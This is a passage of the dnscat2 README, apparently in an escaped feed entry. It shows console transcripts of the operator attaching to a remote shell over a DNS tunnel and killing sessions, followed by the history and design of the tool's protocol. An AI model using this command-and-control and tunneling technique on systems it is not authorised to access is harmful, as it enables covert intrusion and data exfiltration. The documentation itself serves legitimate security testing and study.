until you type a command:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;dnscat2&amp;gt; windows&#xA;0 :: main [active]&#xA;  dns1 :: DNS Driver running on 0.0.0.0:53531 domains = skullseclabs.org [*]&#xA;  1 :: command session (ubuntu-64)&#xA;  2 :: sh (ubuntu-64) [*]&#xA;&#xA;dnscat2&amp;gt; session -i 2&#xA;New window created: 2&#xA;history_size (session) =&amp;gt; 1000&#xA;This is a console session!&#xA;&#xA;That means that anything you type will be sent as-is to the&#xA;client, and anything they type will be displayed as-is on the&#xA;screen! If the client is executing a command and you don&#39;t&#xA;see a prompt, try typing &#39;pwd&#39; or something!&#xA;&#xA;To go back, type ctrl-z.&#xA;&#xA;sh (ubuntu-64) 2&amp;gt; pwd&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;/home/ron/tools/dnscat2/client&lt;/p&gt; &#xA;&lt;p&gt;To escape this, you can use ctrl-z or type &#34;exit&#34; (which will kill the session).&lt;/p&gt; &#xA;&lt;p&gt;Lastly, to kill a session, the &lt;code&gt;kill&lt;/code&gt; command can be used:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;dnscat2&amp;gt; windows&#xA;0 :: main [active]&#xA;  dns1 :: DNS Driver running on 0.0.0.0:53531 domains = skullseclabs.org [*]&#xA;  1 :: command session (ubuntu-64)&#xA;  2 :: sh (ubuntu-64) [*]&#xA;dnscat2&amp;gt; kill 2&#xA;Session 2 has been sent the kill signal!&#xA;Session 2 has been killed&#xA;dnscat2&amp;gt; windows&#xA;0 :: main [active]&#xA;  dns1 :: DNS Driver running on 0.0.0.0:53531 domains = skullseclabs.org [*]&#xA;  1 :: command session (ubuntu-64)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h1&gt;History&lt;/h1&gt; &#xA;&lt;p&gt;In the past, there were several DNS tunneling tools. One was called &lt;a href=&#34;http://tadek.pietraszek.org/projects/DNScat/index.html&#34;&gt;dnscat&lt;/a&gt;, written by Tadek Pietraszek. The problem is, it&#39;s written in Java, and I really wanted something that could run basically everywhere.&lt;/p&gt; &#xA;&lt;p&gt;That version of dnscat was based on a tool called NSTX, whose page &lt;a href=&#34;http://freecode.com/projects/nstx/&#34;&gt;no longer exists&lt;/a&gt; and isn&#39;t even in the Wayback Machine, so I know nothing about it.&lt;/p&gt; &#xA;&lt;p&gt;Later, I wrote a C implementation and called it dnscat (without permission), since the previous Java version was unmaintained and I really liked the name (I toyed with calling it dnscat-ng, but -ng is a bit wordy for my taste). It worked, but there were a lot of problems. The client and server were the same tool, like netcat, which, because DNS is such a client/server model, didn&#39;t work out that well. The other problem was that I had linked it too much to the DNS protocol, so it could only run over DNS.&lt;/p&gt; &#xA;&lt;p&gt;dnscat2 - the successor to dnscat - is an attempt to right some of the wrongs that I had committed. dnscat2 has a separate server (Ruby) and client (C) and treats everything as a stream of bytes, and uses a driver, of sorts, to convert that stream of bytes into dns requests and back. Thus, it&#39;s a layered protocol, with DNS being a lower layer.&lt;/p&gt; &#xA;&lt;p&gt;As a result, I invented a protocol that I&#39;m calling the dnscat protocol. You can find documentation about it in docs/protocol.md. It&#39;s a simple polling network protocol, where the client occasionally polls the server, and the server responds with a message (or an error code). The protocol is designed to be resilient to the various issues I had with dnscat1 - that is, it can handle out-of-order packets, dropped packets, and duplicated packets equally well.&lt;/p&gt;</summary>
  </entry>
</feed>